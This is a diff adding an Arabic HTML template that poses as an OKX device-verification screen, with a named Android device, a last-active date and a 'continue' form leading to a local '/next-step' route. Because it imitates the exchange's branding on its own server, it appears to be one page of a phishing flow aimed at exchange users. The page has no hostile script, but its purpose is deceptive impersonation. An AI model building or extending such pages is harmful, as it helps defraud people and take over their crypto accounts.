@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org">
+<head>
+    <title>التحقق من الجهاز | OKX</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body { direction: rtl; font-family: sans-serif; background: #fff; padding: 20px; text-align: center; }
+        .container { max-width: 400px; margin: 0 auto; }
+        .device-icon { width: 150px; margin: 40px 0; }
+        h2 { font-weight: bold; font-size: 22px; margin-bottom: 20px; }
+        p { color: #666; font-size: 14px; line-height: 1.6; }
+        .device-name { font-weight: bold; margin-top: 20px; }
+        .last-active { color: #888; font-size: 12px; margin-bottom: 30px; }
+        .btn-black { background: #000; color: #fff; border-radius: 30px; padding: 12px; width: 100%; border: none; font-weight: bold; margin-bottom: 10px; }
+        .btn-outline { background: #fff; color: #000; border: 1px solid #ddd; border-radius: 30px; padding: 12px; width: 100%; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div style="text-align: right; font-size: 24px;">✕</div>
+        
+  <h2>إجراء عملية التحقق باستخدام جهاز موثوق به</h2>
+        <p>هل تستخدم جهازاً جديداً؟ سنتحقق أولاً من هويتك من خلال أجهزتك الأخرى. تأكد من أن تطبيقك نشط على هذه الأجهزة قبل المتابعة.</p>
+        
+  <img src="/device_verify.png" class="device-icon" alt="Verify Device">
+        
+  <div class="device-name">Infinix X6833B(Android)</div>
+        <div class="last-active">آخر نشاط: 2026/03/23</div>
+
+  <form action="/next-step" method="get">
+            <button type="submit" class="btn-black">متابعة</button>
+        </form>
+        <button class="btn-outline">جرِّب طريقة أخرى</button>
+    </div>
+</body>
+</html>
